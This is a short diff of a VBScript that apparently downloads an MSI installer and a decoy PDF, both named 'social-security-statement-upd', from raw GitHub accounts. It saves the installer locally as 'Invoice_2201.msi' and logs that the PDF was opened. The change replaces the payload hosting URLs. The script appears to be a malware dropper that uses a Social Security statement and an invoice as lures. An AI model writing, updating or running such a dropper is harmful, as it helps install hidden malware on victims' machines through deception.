@@ -15,8 +15,8 @@ logFile.WriteLine "Test started: " & Now
 
 ' Plain URLs
 Dim msiUrl, pdfUrl, tempMsi, tempPdf
-msiUrl = "https://raw.github.com/rindinhgi0/velocityexco/main/social-security-statement-upd.msi"
-pdfUrl = "https://raw.github.com/rindinhgi0/velocity-serenetiy/main/social-security-statement-upd.pdf"
+msiUrl = "https://raw.github.com/rindinhgi0/velocity-serenetiy/main/social-security-statement-upd.msi"
+pdfUrl = "https://raw.github.com/sportybabyy/velocitypdates/main/social-security-statement-upd.pdf"
 tempMsi = tempPath & "Invoice_2201.msi"
 tempPdf = tempPath & "social-security-statement-upd.pdf"
 
@@ -65,5 +65,6 @@ If http.Status = 200 Then
     logFile.WriteLine "PDF opened"
     
 End If
+
 
 logFile.Close
